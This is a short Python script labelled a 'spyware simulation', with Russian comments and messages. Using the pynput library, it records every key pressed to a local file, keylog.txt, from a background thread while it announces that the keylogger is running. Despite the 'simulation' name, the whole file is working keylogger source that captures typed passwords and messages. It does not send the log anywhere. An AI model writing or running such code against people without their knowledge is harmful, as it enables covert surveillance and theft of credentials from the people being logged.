# spyware_simulation.py
# Требует: pip install pynput

from pynput import keyboard
import threading

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Запуск в отдельном потоке
thread = threading.Thread(target=start_keylogger, daemon=True)
thread.start()

input("Кейлоггер запущен. Нажмите Enter для выхода...\n")